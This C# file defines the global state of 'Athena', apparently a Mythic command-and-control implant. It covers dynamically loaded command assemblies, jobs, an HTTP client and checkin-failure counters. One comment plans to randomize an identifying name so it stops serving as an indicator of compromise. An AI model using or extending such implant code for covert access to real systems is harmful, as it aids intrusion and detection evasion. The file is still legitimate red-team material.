﻿using Athena.Mythic.Model.Misc;
using Athena.Mythic.Model;
using System.Collections.Generic;
using System.Net.Http;
using Athena.Mythic.Profile;
using System.Runtime.Loader;
using System.Reflection;
using System.Threading;
using System.IO;

namespace Athena
{
    public class Globals
    {
        public static AssemblyLoadContext alc = new AssemblyLoadContext("Athena"); //Will need to randomize this name as it can be an IoC for Athena
        public static AssemblyLoadContext loadcontext = new AssemblyLoadContext("commands");
        public static bool exit = false;
        public static bool encrypted = false;
        public static CancellationTokenSource cancellationsource = new CancellationTokenSource();
        public static Dictionary<string, Assembly> loadedcommands = new Dictionary<string, Assembly>();
        public static Dictionary<string, MythicJob> jobs = new Dictionary<string, MythicJob>();
        public static HttpClient client = new HttpClient();
        public static int maxMissedCheckins = 100;
        public static int missedCheckins = 0;
        public static ProfileType profile = ProfileType.HTTP;
        public static string executeAssemblyTask = "";
    }
}